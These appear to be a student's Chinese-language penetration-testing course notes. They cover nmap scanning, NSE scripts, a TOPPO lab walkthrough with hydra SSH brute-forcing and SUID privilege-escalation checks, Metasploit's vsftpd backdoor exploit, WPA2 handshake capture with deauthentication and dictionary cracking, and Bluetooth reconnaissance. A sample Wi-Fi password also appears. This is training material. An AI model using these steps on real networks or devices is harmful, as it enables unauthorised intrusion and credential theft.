	  类型  代理服务器的IP地址  端口  [用户名 密码]
	  代理的类型有HTTP、SOCKS代理等

语法
  proxychains4 [ -f 配置文件 ] <程序>
proxychains的代理方式有三种：

 Different chaining options are supported. For instance:

           •   take random proxy from the list（random_chain ）

           •   chain proxies in exact order（strict_chain，严格的代理）

           •   chain proxies in dynamic order (smart exclude dead proxies from chain)  dynamic_chain
strict_chain，严格的代理（默认）
所有的代理都会发挥作用，如果有一个代理不在线，则会报错
all proxies chained in the order as they appear in the list
all proxies must be online to play in chain
otherwise EINTR is returned to the app

dynamic_chain 动态的代理
我们可以设置动态链（ dynamic chaining）它通过列表中
的每个代理运行我们的流量，如果其中一个代理宕机或没有响应，则自动转到列表中的下一个代理，而不会抛出错误。如果我们不设置这个， 则其中一个失败的代理将会破坏我们整个的请求。
random_chain  随机的代理
其中 proxychain 将从列表中随机选择一组 IP地址，并使用它们创建代理链。
这意味着每次我们使用 proxychain时，代理对目标的外观都会有所不同，这使得从源跟踪我们的流量变得更加困难。
这个选项也被认为是“动态”的，因为如果一个代理关闭，它将跳到下一个代理。


同时只能设置一种。


  
【案例1】

以匿名的方式扫描目标主机
nmap -sT -Pn 主机

	-sT  tcp的连接扫描 
	-Pn  禁用主机（假设主机是存活的）

Step01 修改/etc/proxychains4.conf
最后
socks4          192.168.195.1 1080


Socks是一种代理服务，可以将一端的系统连到另一端。
Socks支持多种协议，如HTTP、FTP
Socks分为Socks4和Socks5两种类型
Socks4只支持TCP协议
Socks5可以支持TCP和UDP协议，还支持各种身份验证机制
标准端口为1080

【案例2】通过代理上外网
  proxychains firefox www.163.com
  
### Day52
52.1 VPN

什么是VPN？
全称为virtual private network （虚拟专用网络）

优势：费用低、安全可靠

从个人角度，VPN的好处：
（1）保护隐私
（2）加密流量
（3）科学上网
闪电
https://sdyun.cc/

任何人看到您的流量来自互联网VPN 设备的 IP 地址和位置，而不是您自己的。
另外，您与 VPN 设备之间的所有通信都是加密的，所以即使您的互联网服务提供商也看不到您的通信

VPN service for secure, anonymous and unrestricted internet access on all devices
VPN是一种允许您在不危及您的信息的情况下安全地访问互联网的服务


VPN协议
作用：构建在互联网上安全传送数据的隧道

（1）OpenVPN
通用的VPN协议
可以在不同类型设备工作的最安全、最流行的协议之一。它是一个开源项目
（2）IPSec
用于保护网络层的通信安全
主要用于构建企业VPN
（3）PPTP
点到点隧道协议
老的淘汰的隧道协议，操作系统通常会内置
（4）L2TP
二层隧道协议
比PPTP要安全
使用广泛
（5）WireGuard
新的VPN协议，尚在测试中

52.2 Encrypted Email 加密邮件




邮件加密

ProtonMail项目--瑞士

安全工具：如PGP
企业邮箱

瑞士在保护机密方面有着悠久而传奇的历史

### Day53

****nc
****Nmap

1. Nmap Fundamentals  Nmap的基础

1.1 nmap的介绍

作者：Gordon Lyon

https://nmap.org/p51-11.html

September of 1997

https://nmap.org/

作用：network discovery and security auditing
 nmap是一个免费的功能强大的网络扫描工具，可以跨平台使用，主要用于网络探测和安全审计

"Nmap (Network Mapper) is a free and open source (license) utility for
network discovery and security auditing. Many systems and network
administrators also find it useful for tasks such as network inventory,
managing service upgrade schedules, and monitoring host or service
uptime. Nmap uses raw IP packets in novel ways to determine what hosts
are available on the network, what services (application name and version)
those hosts are offering, what operating systems (and OS versions) they are
running, what type of packet filters/firewalls are in use, and dozens
of other characteristics. It was designed to rapidly scan large networks, but
works fine against single hosts. Nmap runs on all major computer operating
systems, and official binary packages are available for Linux, Windows,
and Mac OS X."

Nmap的家族（包含了很多高级的网络工具）
The Nmap project itself evolved into a family of advanced networking
tools that includes amazing projects such as Ncrack, Ncat, Nping, Zenmap, and, built into
Nmap itself, the Nmap Scripting Engine (NSE).
1.Ncrack--密码的暴力破解
2.ncat --nc的变体
3.Nping 强大的ping工具
4.Zenmap--nmap的图形化工具
5.nmap本身
6.强大的namp脚本引擎（Nmap Scripting Engine (NSE))


1.2 nmap-发现活动主机--HOST DISCOVERY

Finding online hosts

Finding online hosts in networks or on the internet is a common task among penetration
testers and system administrators.

发现活动主机是渗透测试人员（系统管理人员）常见的一项任务。

nmap -V   //查看nmap的版本


实验环境
Kali   192.168.195.0/24
目标：Windows主机
      metasploit2
	  TOPPO靶机（Linux操作系统）
		*.vmdk（VMware虚拟机磁盘文件）
		*.vmx （VMware虚拟机配置文件）
	  
nmap -h //查看nmap的帮助
man nmap

语法：
Usage: 
nmap [Scan Type(s)] [Options] {target specification}

nmap [扫描类型]   [选项]   {目标}



HOST DISCOVERY:
  -sL: List Scan - simply list targets to scan
  -sn: Ping Scan - disable port scan 
  //只做主机发现，不做端口扫描
  -Pn: Treat all hosts as online -- skip host discovery
  -PS/PA/PU/PY[portlist]: TCP SYN/ACK, UDP or SCTP discovery to given ports
  -PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes
  -PO[protocol list]: IP Protocol Ping
  -n/-R: Never do DNS resolution/Always resolve [default: sometimes]
  --dns-servers <serv1[,serv2],...>: Specify custom DNS servers
  --system-dns: Use OS's DNS resolver
  --traceroute: Trace hop path to each host
  
  
 man -t man | ps2pdf -> man.pdf


【Nmap案例1】
nmap -sn  192.168.195.0/24

nmap -sn  192.168.195.0/24 | grep report | awk '{print $5}' > local_ip.txt


目标指定方法
1. 192.168.195.0/24（CIDR，无类域间路由）
Nmap将任何不能识别的选项作为目标，它支持IPv4/IPv6地址、主机名和可以使用通配符和CIDR
### Day54

探测活动主机
nmap -sn 

nmap -sn -vvv  --reason 192.168.4.238

-v 查看详细信息，支持多个v的用法，可以看到更详细的信息
--reason  显示判断的原因

（1）二层探测
  使用arp协议
 对于同一个网段，执行arp探测
 相关工具：arping 192.168.195.70
		   arp-scan -l  
				-l 对本地网络扫描 
 
 （2）三层探测
 使用icmp协议
 
 （3）四层探测
	  TCP协议
  对于不在同一个网段主机
  1）TCP SYN  -->443
  2）TCP ACK  --->80
  3）ICMP TimeSTAMP （时间戳）request 
  
  
 -PS/PA/PU/PY[portlist]: TCP SYN/ACK, UDP or SCTP discovery to given po  
  -PS  TCP SYN 扫描
  -PA  TCP ACK 扫描
 nmap -PA 192.168.4.238
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-25 10:21 CST
Nmap scan report for 192.168.4.238
Host is up (0.0064s latency).
Not shown: 983 filtered ports
PORT      STATE SERVICE
21/tcp    open  ftp
135/tcp   open  msrpc
443/tcp   open  https
445/tcp   open  microsoft-ds
902/tcp   open  iss-realsecure
912/tcp   open  apex-mesh
1025/tcp  open  NFS-or-IIS
1026/tcp  open  LSA-or-nterm
1027/tcp  open  IIS
1028/tcp  open  unknown
1034/tcp  open  zincite-a
1038/tcp  open  mtqp
1039/tcp  open  sbl
3389/tcp  open  ms-wbt-server
5800/tcp  open  vnc-http
5900/tcp  open  vnc
15000/tcp open  hydap

-PU  UDP扫描
-PY  使用sctp协议扫描
nmap -PY21  192.168.4.238
流控制传输协议（SCTP，Stream Control Transmission Protocol）是一种在网络连接两端之间同时传输多个数据流的协议。SCTP提供的服务与UDP和TCP类似。

 nmap -PA21,22 192.168.4.238
 nmap -PA21-22 192.168.4.238
 nmap -PA21-22,80 192.168.4.238


主机发现的其他选项
（1）
--traceroute: Trace hop path to each host

探测到达主机的路径
nmap -sn --traceroute 163.com  www.sdxhce.com

（2）
使用nse探测主机存活

nmap的脚本引擎（NSE）默认目录 /usr/share/nmap/scripts
nmap的脚本引擎文件的扩展名*.nse
--script

nmap -sn --script dns-brute qq.com

dns-brute  子域名的爆破


nmap -sn --script broadcast-ping 192.168.0.1/24

broadcast-ping 使用广播ping探测主机存活


（3）icmp探测
-PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes

-PE icmp echo请求
-PP icmp 时间戳请求
-PM icmp  子网掩码请求

（4）-PO 使用指定的协议探测

### 55 day

port scanning（端口扫描）
（1）开放了哪些端口（端口的状态）
（2）端口对应什么服务及其服务的版本

nmap -v -A scanme.nmap.org


nmap --dns-servers 8.8.8.8,8.8.4.4 scanme.nmap.org

--dns-servers  指定DNS服务器

Nmap categorizes ports into the following states:
Nmap对于端口状态的分类：
• Open: Open indicates that a service is listening for connections on this port.
//开放，一个服务在运行（监听），可以建立连接

• Closed: Closed indicates that the probes were received, but it was concluded that
there was no service running on this port.
//关闭，没有服务在该端口运行
• Filtered: Filtered indicates that there were no signs that the probes were received
and the state could not be established. This could indicate that the probes are being
dropped by some kind of filtering.
//过滤，没有收到probes（探针），不能建立连接（状态），可能前端有防火墙

• Unfiltered: Unfiltered indicates that the probes were received but a state could not
be established.
//未过滤，收到了probes，但不能建立连接（状态）

• Open/Filtered: This indicates that the port was filtered or open but the state could
not be established.
开放/过滤，端口可能被过滤了或者端口是开放的，但不能建立连接

• Closed/Filtered: This indicates that the port was filtered or closed but the state
could not be established.

关闭/过滤，端口可能被过滤了或者端口是关闭的，不能建立连接




phpStudy---快速建站（WNMP或WAMP）
	LNMP

nmap -Pn scanme.nmap.org
-Pn  
	跳过主机发现，直接扫描
nmap -n scanme.nmap.org
	-n  禁用DNS解析（默认情况下，会尝试用DNS反向解析IP地址）


a SYN stealth scan or a TCP connect scan


SYN stealth scan  syn秘密扫描，也称为半开连接扫描 
也是默认扫描类型，对应的选项为-sS
普通用户是不能执行秘密扫描（）
┌──(xiaofeixia㉿kali2)-[~]
└─$ nmap -Pn  -sS -p3389 192.168.195.70
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
You requested a scan type which requires root privileges.
QUITTING!


TCP connect scan 完全连接扫描 （三次握手是完整的）
对应的选项为-sT

nmap的默认扫描行为
nmap <目标>  
1）先DNS解析   （-n）
2）检查主机是否存活  （-Pn）
3）扫描类型为SYN扫描（秘密扫描 -sS）
   但如果是一个普通用户执行，则执行的是完全连接扫描（-sT）
4）默认扫描的端口是一些常用的服务端口

Nmap的端口指定技巧
 Scanning specific port ranges 指定扫描的端口范围
 -p 
 
 Port list separated by commas: $ nmap -p80,443 目标   //端口列表
 
 nmap -p1-100 目标  //端口范围
 
 Alias for all ports from 1 to 65535: # nmap -p- localhost  //所有端口（1 to 65535）
 
 Specific ports by protocol: # nmap -pT:25,U:53 <target>  //指定端口的协议
 
 Service name: # nmap -p smtp <target> //使用服务名称
 
 nmap -Pn -p ftp 192.168.195.29
 
 Service name with wildcards: # nmap -p smtp* <target> //指定服务名称时也可以使用通配符

 ┌──(root💀kali2)-[~]
└─# nmap -Pn -p ftp* 192.168.195.29
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-26 11:37 CST
Nmap scan report for 192.168.195.29
Host is up (0.00026s latency).

PORT     STATE  SERVICE
20/tcp   closed ftp-data
21/tcp   open   ftp
574/tcp  closed ftp-agent
989/tcp  closed ftps-data
990/tcp  closed ftps
8021/tcp closed ftp-proxy

Only ports registered in the Nmap services database: 
# nmap  -p[1-65535] <target> //仅扫描在Nmap服务数据库中注册的端口

 ### 56 day
56.1. 指定网络接口
 -e

nmap -e eth1 目标
 
 56.2. 目标的指定
 
 TARGET SPECIFICATION:
  Can pass hostnames, IP addresses, networks, etc.
  Ex: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254
  -iL <inputfilename>: Input from list of hosts/networks
  -iR <num hosts>: Choose random targets
  --exclude <host1[,host2][,host3],...>: Exclude hosts/networks
  --excludefile <exclude_file>: Exclude list from file

 nmap -p25,80 -O -T4 192.168.1.1/24 scanme.nmap.org/24
 
 多个目标用空格分隔，如果Nmap不识别的选项都认为是潜在的目标
 （1）主机名  scanme.nmap.org
 （2）CIDR    192.168.1.1/24
              scanme.nmap.org/24  （C段渗透攻击）
			  
  nmap -p80 111.161.126.0/24
 （3）单个主机
 （4）10.0.0-255.1-254
      10.0.0.1-254
      10.0.1.1-254
      10.0.2.1-254
	  
	  10.0.255.1-254
	  
	  nmap -sn 192.168.0-10.1-254
  （5）范围
  nmap -sn 192.168.195.160 192.168.195.161 192.168.195.162 192.168.195.163
  nmap -sn 192.168.195.160-163 
  nmap -sn 192.168.195.* 
  nmap -sn 192.168.195.0/24  
  （6）排除（exclude）指定的主机 Excluding hosts from scans
  nmap -sn 192.168.195.* --exclude 192.168.195.1,192.168.195.6
  
  nmap -sn 192.168.195.* --exclude 192.168.195.1-2,192.168.195.254

 （7）排除来自指定文件中的主机
  --excludefile
  
  （8）扫描来自指定文件中主机
    -iL 
	
	nmap -Pn -p80 --open -iL local_ip.txt
	
	--open  只列出开放的端口的主机
（9）-iR
    随机指定一定数量主机扫描
  
  
 56.3 Fingerprinting OSes and services running on a target
 
 操作系统和服务版本的检测
 了解操作系统和服务的确切软件版本对于寻找安全漏洞的人来说非常有价值
 
 nmap -sV 目标
	服务版本的检测
 nmap -O  目标
	操作系统的检测
Step1  nmap -p21 -sV -O 192.168.195.29

 21/tcp open  ftp     vsftpd 2.3.4
 OS CPE: cpe:/o:linux:linux_kernel:2.6
Step02 查找漏洞

https://www.exploit-db.com/  漏洞利用数据库

利用searchsploit工具查找漏洞利用数据库

 searchsploit vsftpd 2.3.4

Step03 漏洞利用
工具：Metasploit

1）查找漏洞利用模块
  search vsftpd
2）调用模块
   use  名称
   或
   use  编号 
   use exploit/unix/ftp/vsftpd_234_backdoor
   info   查看模块的信息

   
3）查看模块的选项
show options

RHOSTS ---远程主机

4）设置选项
	set  选项名称  值
	
	unset 选项名称   取消选项相应的值 
5）漏洞利用
exploit

python -c 'import pty;pty.spawn("/bin/bash")'  获得交互式shell

 ### 57 day 

操作系统检测

-O  

检测网络中开放3389端口的主机

nmap -p3389 --open 192.168.195.0/24


远程桌面服务  3389

确定目标操作系统的类型

nmap -O 192.168.195.81  *****

猜测对方主机可能存在MS12-020 （远程桌面服务的一个漏洞）

在metasploit中进行漏洞的利用
search MS12-020

-sV 服务版本检测  *****
	识别安全漏洞、确保服务在给定端口上运行、检查补丁或更新包是否已成功应用。
 -sV: Probe open ports to determine service/version info
  --version-intensity <level>: Set from 0 (light) to 9 (try all probes)
  --version-light: Limit to most likely probes (intensity 2)
  --version-all: Try every single probe (intensity 9)
  --version-trace: Show detailed version scan activity (for debugging)


-O  操作系统检测

nmap -O 192.168.195.81             
TCP/IP fingerprinting (for OS scan) requires root privileges.
//需要root权限
attempt OS detection by sending several probes
to the TCP, UDP, and ICMP protocols against opened and closed ports. 
//使用TCP、UDP、ICMP发送多种探针到指定的端口（开放的或关闭的）
//操作系统检测功能非常强大，支持主流操作系统的检测，也支持家用路由器、摄像头、其他的硬件设备操作系统的检测
CPE全称是Common Platform Enumeration，通用平台枚举。它是对识别出来的操作系统的一种命名方式
其他选项

对服务版本进行深度检测  --version-intensity，级别从0到9
nmap -sV --version-intensity 9 <target>


Aggressive detection mode---积极检测模式*****
-A，包含以下检测
enables OS detection (-O),操作系统检测
 version detection (-sV), 服务版本检测
 script scanning (-sC), 默认的脚本检测
traceroute (--traceroute) 路由跟踪


If OS detection fails, you can use --osscan-guess to force Nmap to guess the OS:
如果操作系统检测失败，可以加上 --osscan-guess 让Nmap去猜测操作系统的类型
nmap -O --osscan-guess <target>



57.2 Nmap的阶段实战-TOPPO靶机

1. 信息探测
arp-scan -l
nmap -A 192.168.195.162 
22
80
111

2. http://192.168.195.162
  静态站点
3. 对Web站点进行目录的枚举

使用nmap的http-enum脚本引擎进行Web站点目录枚举

nmap --script http-enum 192.168.195.162

Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-30 10:57 CST
Nmap scan report for 192.168.195.162
Host is up (0.00012s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
| http-enum: 
|   /admin/: Possible admin folder
|   /mail/: Mail folder
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.10 (debian)'
|   /img/: Potentially interesting directory w/ listing on 'apache/2.4.10 (debian)'
|   /js/: Potentially interesting directory w/ listing on 'apache/2.4.10 (debian)'
|   /manual/: Potentially interesting folder
|_  /vendor/: Potentially interesting directory w/ listing on 'apache/2.4.10 (debian)'
111/tcp open  rpcbind
MAC Address: 00:0C:29:BC:F6:3C (VMware)


4. http://192.168.195.162/admin/notes.txt

curl "http://192.168.195.162/admin/notes.txt"  

curl  基于文本的浏览器

得到了一个密码 12345ted123

这是谁的密码？

联想到之前的22端口---尝试对SSH进行暴力破解
用户信息？
（1）对站点进行信息的收集制作用户或密码文件  cewl
（2）利用记事本提供的信息制作用户文件
12345
ted
ted123
123
5. 暴力破解
hydra
hydra -L user.txt  -p 12345ted123 192.168.195.162 ssh    
6. SSH登录
ssh ted@192.168.195.162
7.提权之前
7.1. 充分的信息收集

uname -r
cat /etc/*-release
cat /etc/passwd

find / -perm -u=s -type f  2>/dev/null  //查找SUID位的文件
find / -perm -4000 -type f  2>/dev/null

/usr/bin/python2.7
		/usr/bin/python2.7 -c 'import pty;pty.spawn("/bin/sh")'
/usr/bin/mawk


 nmap -sP 192.168.195.0/24
 -sP  直连网段扫描，发现活动主机

 ### 58 day 
 同一网段获取靶机IP地址的方法
 （1）arp-scan -l
 （2）nmap -sP 
 （3）nmap -sn
 （4）netdiscover -r 192.168.195.0/24
 （5）nbtscan 192.168.195.1-255
 
时序
	-T（0-5）
	-T4
		
58.2. Using NSE scripts against a target host
使用NMAP的脚本引擎对目标主机扫描 
对NSE的理解
（1）扩展Nmap的功能
（2）使用Lua scripts
在所有脚本引擎中，Lua的速度是最快的。这一切都决定了Lua是作为嵌入式脚本的最佳选择
（3）Nmap脚本目录　/usr/share/nmap/scripts
（4）nmap --script-updatedb  更新NSE的数据库

 ls  /usr/share/nmap/scripts | awk -F .  '{print $1}' | sort >nmap_nse.list 
 
（5）使用主机和端口规则，它们甚至可以被配置为在没有端口扫描目标的情况下运行，这在侦察任务中非常有用。

SCRIPT SCAN:
  -sC: equivalent to --script=default
  --script=<Lua scripts>: <Lua scripts> is a comma separated list of
           directories, script-files or script-categories
  --script-args=<n1=v1,[n2=v2,...]>: provide arguments to scripts
  --script-args-file=filename: provide NSE script args in a file
  --script-trace: Show all data sent and received
  --script-updatedb: Update the script database.
  --script-help=<Lua scripts>: Show help about scripts.
           <Lua scripts> is a comma-separated list of script-files or
           script-categories.

（6）常用的脚本引擎选项

--script  脚本的名称或脚本的类别
		  如果有多个脚本，脚本之间用逗号分隔
（7）常用的脚本类别

（8）用法

1）nmap --script dns-brute <target>
2）nmap --script http-headers,http-title scanme.nmap.org
3）nmap -sV --script vuln <target>
4）nmap -sV --script="version,discovery" <target>
5）nmap -sV --script "not exploit" <target>
6）nmap -sV --script "(http-*) and not(http-slowloris or http-brute)" <target>
//执行所有http开头的脚本，但这两个脚本http-slowloris、http-brute除外



### 59 day 

--script-help   查看脚本引擎的帮助

smb-vuln-ms08-067

SMB协议，又称为CIFS协议，文件共享所使用的协议（如Windows的共享、Samba服务）
使用445端口

MS08-067
CVE-2008-4250
nmap  --script smb-vuln-ms08-067 192.168.195.32

59.2 NSE script arguments（脚本引擎参数）
--script-args
通过--script-args将参数传递给NSE脚本
参数的结构为：name=value，以,分割多个参数对
name和value中都不该该包含如下符号：{   }   ,  =

一些网站会通过判断 user-agent 来判断请求是否合法

nmap -p12380 -sV --script http-title --script-args http.useragent="IE 10" 192.168.195.166

可以使用script argument aliases（脚本参数的别名）

nmap -p80 --script http-trace --script-args http-trace.path  目标
nmap -p80 --script http-trace --script-args path  目标

--script-args-file=filename//脚本的参数来自于指定的文件


nmap -p12380 -sV --script http-title --script-args-file=/root/work/exam/day59/http.txt 192.168.195.166

┌──(root💀kali2)-[~/work/exam/day59]
└─# cat http.txt
 http.useragent="IE 10"


59.3. Debugging NSE scripts 脚本的调试开关
--script-trace
 -d[1-9]
 debugging level 调试级别
 
https://github.com/cldrn/nmap-nsescripts

https://nmap.org/book/nse-usage.html#nse-args
https://nmap.org/nsedoc/scripts/http-title.html

nmap -sn -PE --packet-trace 192.168.4.238   

-PE  发送的ICMP回显请求
--packet-trace  对发送的包进行跟踪探测

nmap -sn -PE --packet-trace 192.168.4.238   
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-02 11:03 CST
SENT (0.0519s) ICMP [192.168.195.76 > 192.168.4.238 Echo request (type=8/code=0) id=25102 seq=0] IP [ttl=51 id=38606 iplen=28 ]
RCVD (0.0526s) ICMP [192.168.4.238 > 192.168.195.76 Echo reply (type=0/code=0) id=25102 seq=0] IP [ttl=128 id=36617 iplen=28 ]

-PO  
默认使用icmp、IGMP、ip协议探测主机存活
也可以使用自定义的协议
nmap -sn -PO1,2,17 --packet-trace 192.168.4.238
默认上述技术数据是空的，可以通过--data-length 指定数据长度
 nmap -sn -PO1,2,17 --data-length 100 192.168.4.238



┌──(root💀kali2)-[~/work/exam/day59]
└─# nmap -sn -PO --packet-trace 192.168.4.238
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-02 11:09 CST
SENT (0.0532s) ICMP [192.168.195.76 > 192.168.4.238 Echo request (type=8/code=0) id=24664 seq=0] IP [ttl=56 id=30386 iplen=28 ]
SENT (0.0533s) igmp (2) 192.168.195.76 > 192.168.4.238: ttl=53 id=27120 iplen=28 
SENT (0.0533s) ipv4 (4) 192.168.195.76 > 192.168.4.238: ttl=42 id=42167 iplen=20 
RCVD (0.0538s) ICMP [192.168.195.2 > 192.168.195.76 Protocol 2 unreachable (type=3/code=2) ] IP [ttl=128 id=36619 iplen=56 ]
RCVD (0.0538s) ICMP [192.168.195.2 > 192.168.195.76 Protocol 4 unreachable (type=3/code=2) ] IP [ttl=128 id=36620 iplen=48 ]
RCVD (0.0552s) ICMP [192.168.4.238 > 192.168.195.76 Echo reply (type=0/code=0) id=24664 seq=0] IP [ttl=128 id=36621 iplen=28 ]

### 60 day 

CHAP 14 理解和检查无线网络

从您的系统中扫描并连接到其他网络设备的能力对于成为一名成功的黑客至关重要

第一步是学习如何找到这些设备

1.无线的概念
（1）
AP 无线接入点
SSID 网络的名称
ESSID 
BSSID 唯一标识每个AP，AP的MAC地址  Access Point: 88:C3:97:C2:F1:4E
（2）Wifi的安全协议
wep 不安全
WPA 相对安全
WPA2-PSK 更为安全，最常用
（3）Wifi的三种操作模式
Manage  管理 这意味着它已准备好加入或已加入 AP
Master  主要 master，这意味着它已准备好充当或已经加入 AP
Monitor  监视
（4）频率
2.4GHZ
5GHZ


2.基本无线网络命令


wlan0  无线网卡的命名
（1）iwconfig 仅显示无线网卡及其数据

（2）ifconfig wlan0 up  启用无线网卡

systemctl start NetworkManager //启动网络管理器

（3）iwlist
如果您不确定要连接哪一个 Wi-Fi AP，可以使用 iwlist 命令查看您的网卡可以访问的所有无线接入点

iwlist 接口  动作
iwlist wlan0 scanning
扫描无线信号，查看可以接入的wifi
 Cell 02 - Address: 88:C3:97:C2:F1:4E
                    Channel:6
                    Frequency:2.437 GHz (Channel 6)
                    Quality=70/70  Signal level=-36 dBm  
                    Encryption key:on
                    ESSID:"Xiaomi_20A8"
                    Bit Rates:1 Mb/s; 2 Mb/s; 5.5 Mb/s; 11 Mb/s; 6 Mb/s
                              9 Mb/s; 12 Mb/s; 18 Mb/s
                    Bit Rates:24 Mb/s; 36 Mb/s; 48 Mb/s; 54 Mb/s
                    Mode:Master

为了进行各种不同的入侵攻击，你将需要
	1）目标 AP 的 MAC 地（ BSSID）
	2）客户端的 MAC 地址（另一个无线网卡）
	3）AP 操作的通道
来执行任何类型的黑客攻击


（4）nmcli-网络管理器的命令行方式
为网络接口（包括无线接口）提供高级接口的 Linux 守护程序，称为网络管理器--nmcli

nmcli dev wifi 类似于iwlist
查看无线信号
┌──(root💀kali2)-[~]
└─# nmcli dev wifi                                        
    

nmcli dev wifi connect SSID的名称 password 密码
nmcli dev wifi connect  Xiaomi_20A8 password xiaoxiao.999

iw list  查看无线网卡支持的模式

Supported interface modes:
                 * IBSS
                 * managed
                 * AP
                 * AP/VLAN
                 * monitor   ******
                 * mesh point
                 * P2P-client
                 * P2P-GO
                 * outside context of a BSS

aireplay-ng -9 wlan0  //查看无线网卡是否支持数据包的注入功能
ioctl(SIOCSIWMODE) failed: Device or resource busy
09:04:30  Trying broadcast probe requests...
09:04:30  Injection is working!

笔记61
### 61 day 

对无线密码进行破解

使用 aircrack-ng 进行 Wi-Fi 侦查

1. 需要获取的信息
在考虑攻击 Wi-Fi AP 之前，你需要
（1）目标 AP（ BSSID）的 MAC 地址
（2）客户端的 MAC 地址
（3）AP 正在运行的信道
（4）ESSID
方法：iwlist wlan0 scanning
	  nmcli dev wifi 
	  airodump-ng wlan0mon

IN-USE  BSSID              SSID                 MODE   CHAN  RATE        SIGNAL  BARS  SECURITY  
      88:C3:97:C2:F1:4E  Xiaomi_20A8           Infra     6     270 Mbit/s  100     ▂▄▆█  WPA1 WPA2 


2. 需要准备
2.1 一块能够支持（monitor）模式和数据包注入功能的网卡
iw list

2.2.首先需要将无线网卡置于monitor模式，以便网卡能够看到所有经过它的流量
监控模式类似于有线网卡上的混杂模式（promiscuous）。
方法：
要将无线网卡置于monitor模式，请使用 Aircrack-ng 套件中的 airmon-ng 命令
airmon-ng start wlan0

将无线网卡置于monitor模式之后，airmon-ng 将重命名你的无线接口如wlan0mon

iwconfig

wlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.457 GHz  Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:off



2.3 准备相关工具
   aircrack-ng（套件）
   Aircrack-ng is a complete suite of tools to assess WiFi network security.
   用于无线网络安全相关工具的集合（套件）
   熟悉无线网络相关的命令
### ### 

2.4. 获取数据

airodump-ng 命令捕获
并显示来自广播 AP 和连接到这些 AP 或附近的任何客户端的关键数据
使用：（1）airodump-ng wlan0mon  获取所有AP及其客户端的信息
      （2）对指定AP（感兴趣）的信息进行探测，获取到客户端的MAC地址
	  airodump-ng -c 6 --bssid 88:C3:97:C2:F1:4E wlan0mon 
	  
	  我的笔记本：18:56:80:DB:C9:19
2.5. 无线破解
      （3）保存指定AP的报文
	  airodump-ng -c 6 --bssid 88:C3:97:C2:F1:4E  -w xiaofeixia wlan0mon

      （4）切断指定客户端与无线AP的连接
	  aireplay-ng --deauth 100 -a 88:C3:97:C2:F1:4E -c 18:56:80:DB:C9:19 wlan0mon
	  
	  --deauth  发送断开连接报文的个数
	  -a  指定的AP
	  -c  指定的客户端
	  
	  你可以使用 aireplay-ng 命令取消（取消身份验证）与 AP 连接的任何人，并强制他
     们重新身份验证到 AP，当他们重新验证时，你可以捕获在 WPA2-PSK 四次握手中交换的密码散
     列。
	  
	  （5）通过aircrack-ng使用字典破解获取的无线报文
	  
	  准备好字典文件wordlist.dic
	  
	  
	  aircrack-ng -w wordlist.dic -b 88:C3:97:C2:F1:4E xiaofeixia-01.cap
	  
	  -w 指定字典文件  
	  -b 你的AP的BSSID
	  xiaofeixia.cap 保存的无线报文

### 62 day 
62.1 蓝牙基础

1.蓝牙是一种用于低功耗近场通信（距离<10米）的通用协议，使用扩频在 2.4-2.485GHz 下工作，跳频速度为每秒 1600跳（这种跳频是一种安全措施）。
2.它由瑞典爱立信公司于 1994 年开发

3. 连接两个蓝牙设备被称为配对。
几乎任何两个蓝牙设备都可以相互连接，但只有在处于可发现模式时才能配对。
处于可发现模式的蓝牙设备传输以下信息：

4. 每个设备都有一个唯一的 48 位标识符（类似于 MAC 的地址），通常还有一个制造商指定的名称

5. 当两个设备配对时，它们交换一个密钥或链接密钥。每个密钥存储这个链接键，以便在将来的配对中识别另一个。
62.2 对蓝牙设备的探测

Linux 有一个称为 bluez 的蓝牙协议栈的实现
BlueZ 有许多简单的工具，我们可以用来管理和扫描蓝牙设备
┌──(root💀kali2)-[~/work/app/Empire]
└─# dpkg -l | grep bluez  
ii  bluez                                  5.61-1+kali1                       amd64        Bluetooth tools and daemons

dpkg -L bluez | less  

常用的工具

（1）hciconfig 
这个工具的操作与 Linux 中的 ifconfig 非常相似
查看蓝牙设备
┌──(root💀kali2)-[~/work/app/Empire]
└─# hciconfig        
hci0:   Type: Primary  Bus: USB
        BD Address: 18:56:80:DB:C9:1D  ACL MTU: 8192:128  SCO MTU: 64:128
        DOWN 
        RX bytes:510 acl:0 sco:0 events:23 errors:0
        TX bytes:339 acl:0 sco:0 commands:23 errors:0
启用蓝牙设备
 hciconfig hci0 up
 
（2）hcitool 
此查询工具可以为我们提供设备名称、设备 ID、设备类别和设备时钟信息，使设备能够同步工作。

hcitool scan  扫描蓝牙设备

PS:蓝牙设备要处于发现模式

hcitool inq  查询蓝牙设备信息
得到设备的 MAC 地址、时钟偏移量和设备类别

┌──(root💀kali2)-[~/work/app/Empire]
└─# hcitool inq 
Inquiring ...
        4C:02:20:47:90:32       clock offset: 0x0000    class: 0x5a020c
        E4:0C:FD:85:7A:20       clock offset: 0x0000    class: 0x5a020c
        E0:1F:88:E2:49:CC       clock offset: 0x0000    class: 0x5a020c
        A4:50:46:42:90:FA       clock offset: 0x0000    class: 0x5a020c
        10:F6:05:A7:54:18       clock offset: 0x0000    class: 0x5a020c
        4C:02:20:2C:78:76       clock offset: 0x0000    class: 0x5a020c
        70:66:55:0A:19:D0       clock offset: 0x0000    class: 0x2a010c
        FC:A5:D0:EE:4F:24       clock offset: 0x0000    class: 0x5a020c
   
蓝牙技术联盟（SIG）是一个以制定蓝牙规范，以推动蓝牙技术为宗旨的跨国组织。
它拥有蓝牙的商标，负责认证制造厂商，授权他们使用蓝牙技术与蓝牙标志，但是它本身不负责蓝牙装置的设计、生产及贩售。

（3）
hcidump 这个工具使我们能够嗅探蓝牙通信，这意味着我们可以捕获通过蓝牙信号发送的数据。



62.3. 蓝牙服务发现协议
服务发现协议（ SDP）是一种用于搜索蓝牙服务的蓝牙协议（蓝牙是一套服务）
